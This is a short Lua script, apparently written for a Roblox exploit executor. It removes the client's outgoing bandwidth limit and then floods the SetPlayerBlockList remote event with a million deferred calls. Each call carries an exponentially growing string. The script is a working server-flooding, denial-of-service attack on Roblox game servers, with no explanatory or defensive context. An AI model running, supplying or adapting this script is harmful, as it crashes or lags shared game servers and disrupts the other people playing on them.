local currentScript = getfenv(0).script
coroutine.wrap(newcclosure(function()
  game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
  local maintable = {string.rep("AAA", 1e5)}
  for _ = 1, 1e6 do   
   task.defer(function()
     maintable[1] = maintable[1]:rep(string.len(maintable[1]))
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
   end)
  end
end))()
